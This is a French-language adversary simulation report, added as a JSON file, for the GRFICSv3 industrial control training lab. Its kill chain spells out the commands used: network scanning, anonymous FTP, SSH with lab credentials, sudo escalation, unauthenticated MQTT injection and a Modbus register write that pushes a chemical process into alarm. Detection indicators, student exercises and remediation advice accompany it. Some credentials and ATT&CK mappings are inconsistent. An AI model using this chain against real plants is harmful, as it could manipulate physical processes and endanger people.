@@ -1,0 +1,208 @@
+{
+  "rapport": {
+    "titre": "Adversary Simulation Report — GRFICSv3 OT Lab",
+    "date": "2026-03-01T09:00:00Z",
+    "operateur": "Caldera v5.0 — GRFICS Lab",
+    "duree_totale_minutes": 87,
+    "adversary": "APT-OT-Opportunist",
+    "objectif": "Accès et manipulation du process industriel depuis la DMZ",
+    "resultat": "Impact confirmé sur le process chimique — alarmes déclenchées"
+  },
+
+  "executive_summary": {
+    "fr": "Une campagne d'adversary simulation a été conduite sur l'environnement GRFICSv3. L'attaquant, positionné initialement en DMZ, a progressé jusqu'à la zone ICS en exploitant une chaîne de vulnérabilités documentées. L'impact final est une manipulation des registres Modbus du PLC ayant déclenché des alarmes process. Aucune contre-mesure de détection n'a alerté pendant la campagne.",
+    "impact_process": "Température process portée à 89.2°C (seuil alarme : 85°C). Pression à 6.3 bar (seuil : 6.0 bar). Alarme HMI déclenchée à T+74 min.",
+    "detection": "Aucune alerte générée pendant la campagne."
+  },
+
+  "kill_chain": [
+    {
+      "etape": 1,
+      "nom": "Reconnaissance réseau",
+      "timestamp": "2026-03-01T09:02:14Z",
+      "duree_sec": 45,
+      "technique_attckics": {
+        "id": "T0840",
+        "nom": "Network Connection Enumeration",
+        "tactic": "Discovery"
+      },
+      "outil": "nmap",
+      "commande": "nmap -sV -p- 192.168.90.0/24",
+      "resultat": "Hosts discovered: mqtt-broker(90.50), vuln-server(90.30), hmi(90.107), caldera(90.250)",
+      "ip_source": "192.168.90.6",
+      "ip_destination": "192.168.90.0/24",
+      "protocole": "TCP",
+      "indicateurs_detectables": [
+        "SYN scan intensif depuis 192.168.90.6",
+        "Port scan sur /24 en moins de 60s",
+        "Connexions TCP simultanées anormales"
+      ]
+    },
+    {
+      "etape": 2,
+      "nom": "Accès FTP anonyme",
+      "timestamp": "2026-03-01T09:03:02Z",
+      "duree_sec": 12,
+      "technique_attckics": {
+        "id": "T0807",
+        "nom": "Command-Line Interface",
+        "tactic": "Execution"
+      },
+      "outil": "ftp",
+      "commande": "ftp 192.168.90.30 — login: anonymous",
+      "resultat": "Connexion acceptée. Fichier /public/network_config.txt récupéré.",
+      "credentials_obtenus": {
+        "source": "/public/network_config.txt",
+        "contenu": "SSH emergency: user=admin pass=EmergencyAccess2024, PLC=192.168.95.2"
+      },
+      "ip_source": "192.168.90.6",
+      "ip_destination": "192.168.90.30",
+      "protocole": "FTP/TCP 21",
+      "indicateurs_detectables": [
+        "Connexion FTP anonymous depuis 192.168.90.6",
+        "Téléchargement de network_config.txt",
+        "Session FTP de courte durée (< 15s)"
+      ]
+    },
+    {
+      "etape": 3,
+      "nom": "Connexion SSH avec credentials récupérés",
+      "timestamp": "2026-03-01T09:03:22Z",
+      "duree_sec": 8,
+      "technique_attckics": {
+        "id": "T0859",
+        "nom": "Valid Accounts",
+        "tactic": "Lateral Movement / Initial Access"
+      },
+      "outil": "ssh",
+      "commande": "ssh operator@192.168.90.30 (password123)",
+      "resultat": "Shell obtenu en tant qu'operator sur vuln-server",
+      "ip_source": "192.168.90.6",
+      "ip_destination": "192.168.90.30",
+      "protocole": "SSH/TCP 22",
+      "indicateurs_detectables": [
+        "Connexion SSH réussie depuis 192.168.90.6 vers 90.30",
+        "User: operator — première connexion depuis cette IP",
+        "Connexion < 30s après la session FTP (chaîne rapide)"
+      ]
+    },
+    {
+      "etape": 4,
+      "nom": "Escalade de privilèges via sudo misconfiguration",
+      "timestamp": "2026-03-01T09:03:35Z",
+      "duree_sec": 6,
+      "technique_attckics": {
+        "id": "T0874",
+        "nom": "Hooking",
+        "tactic": "Privilege Escalation"
+      },
+      "outil": "sudo python3",
+      "commande": "sudo python3 -c \"import os; os.system('id')\"",
+      "resultat": "uid=0(root) — escalade confirmée",
+      "ip_source": "local (vuln-server)",
+      "ip_destination": "local",
+      "protocole": "local",
+      "indicateurs_detectables": [
+        "sudo python3 exécuté par operator",
+        "Processus python3 lancé avec UID 0 depuis session operator",
+        "/var/log/auth.log : sudo operator → root"
+      ]
+    },
+    {
+      "etape": 5,
+      "nom": "Collecte de credentials depuis les logs SCADA",
+      "timestamp": "2026-03-01T09:03:48Z",
+      "duree_sec": 4,
+      "technique_attckics": {
+        "id": "T0832",
+        "nom": "Exploitation for Credential Access",
+        "tactic": "Credential Access"
+      },
+      "outil": "cat",
+      "commande": "cat /var/log/scada/system.log",
+      "resultat": "Credentials HMI récupérés: scada_op:Scada@2024!, DB backup pass: Backup#Secure99",
+      "ip_source": "local (vuln-server)",
+      "ip_destination": "local",
+      "protocole": "local",
+      "indicateurs_detectables": [
+        "Lecture de /var/log/scada/system.log par operator",
+        "Accès inhabituel aux logs SCADA depuis un shell interactif"
+      ]
+    },
+    {
+      "etape": 6,
+      "nom": "Injection MQTT sur topic de commande PLC",
+      "timestamp": "2026-03-01T09:04:15Z",
+      "duree_sec": 18,
+      "technique_attckics": {
+        "id": "T0855",
+        "nom": "Unauthorized Command Message",
+        "tactic": "Impair Process Control"
+      },
+      "outil": "mosquitto_pub",
+      "commande": "mosquitto_pub -h 192.168.90.50 -t ics/plc/commands -m '{\"cmd\":\"set_temp\",\"value\":95}'",
+      "resultat": "Message publié sans authentification. Sensor reçoit la commande.",
+      "ip_source": "192.168.90.30",
+      "ip_destination": "192.168.90.50",
+      "protocole": "MQTT/TCP 1883",
+      "indicateurs_detectables": [
+        "Publication sur ics/plc/commands depuis 192.168.90.30 (inhabituel — source normale: 192.168.95.20)",
+        "IP source inattendue sur ce topic",
+        "Payload contenant cmd:set_temp avec valeur hors plage nominale"
+      ]
+    },
+    {
+      "etape": 7,
+      "nom": "Écriture registre Modbus PLC",
+      "timestamp": "2026-03-01T09:05:02Z",
+      "duree_sec": 22,
+      "technique_attckics": {
+        "id": "T0836",
+        "nom": "Modify Parameter",
+        "tactic": "Impair Process Control"
+      },
+      "outil": "pymodbus script",
+      "commande": "write_register(address=1, value=950, slave=1)  # température × 10 = 95°C",
+      "resultat": "Registre 40001 modifié. Process température monte à 89.2°C à T+74min. Alarme HMI.",
+      "ip_source": "192.168.90.30",
+      "ip_destination": "192.168.95.2",
+      "protocole": "Modbus/TCP 502",
+      "impact_process": {
+        "temperature_C": 89.2,
+        "pressure_bar": 6.3,
+        "status": "alarm",
+        "hmi_alert": true,
+        "timestamp_alarme": "2026-03-01T10:14:00Z"
+      },
+      "indicateurs_detectables": [
+        "Connexion Modbus TCP depuis 192.168.90.30 (zone DMZ) vers 192.168.95.2 (zone ICS)",
+        "Function code 6 (Write Single Register) — écriture inhabituelle",
+        "Valeur 950 hors plage nominale (normale: 720-850)",
+        "IP source en dehors de la whitelist Modbus attendue"
+      ]
+    }
+  ],
+
+  "anomalies_cachees": {
+    "description": "Deux comportements anormaux présents dans le pcap fourni mais NON documentés dans ce rapport. Les étudiants du chemin 3 doivent les découvrir par analyse des captures.",
+    "hint_pedagogique": "Analyser le trafic MQTT sur la période T+15min à T+30min et le trafic DNS sortant.",
+    "anomalie_1": {
+      "description": "CACHEE — à découvrir dans le pcap",
+      "indice": "Un client inattendu s'est abonné au topic ics/sensor/raw_modbus"
+    },
+    "anomalie_2": {
+      "description": "CACHEE — à découvrir dans le pcap",
+      "indice": "Des requêtes DNS vers un domaine externe ont été émises depuis vuln-server"
+    }
+  },
+
+  "recommandations_generales": [
+    "Implémenter l'authentification MQTT (SR 1.1) — priorité Critical",
+    "Activer TLS sur tous les protocoles OT exposés (SR 3.1) — priorité High",
+    "Configurer les ACL MQTT par topic et par IP source (SR 3.3) — priorité High",
+    "Supprimer les comptes FTP anonymous et SSH à mots de passe faibles (SR 1.1) — priorité Critical",
+    "Corriger la misconfiguration sudo (SR 2.1) — priorité Critical",
+    "Mettre en place un filtrage inter-zones sur le routeur (SR 5.2) — priorité High",
+    "Supprimer les credentials des logs applicatifs (SR 6.1) — priorité High"
+  ]
+}
